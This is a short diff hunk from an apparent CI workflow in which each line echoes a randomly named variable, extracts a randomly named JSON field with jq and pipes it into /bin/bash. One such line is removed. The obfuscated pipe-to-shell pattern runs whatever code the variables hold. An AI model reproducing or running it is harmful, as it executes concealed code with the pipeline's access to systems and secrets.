@@ -29,7 +29,6 @@ jobs:
           echo $vemgf60593 | jq -r .r770 | /bin/bash
           echo $e3 | jq -r .zvmdl40541 | /bin/bash
           echo $qco674 | jq -r .z9879 | /bin/bash
-          echo $pqhp60 | jq -r .aly5 | /bin/bash
           echo $so1 | jq -r .tprn5 | /bin/bash
           echo $vd70 | jq -r .a54 | /bin/bash
           echo $fupv71695 | jq -r .kp092 | /bin/bash
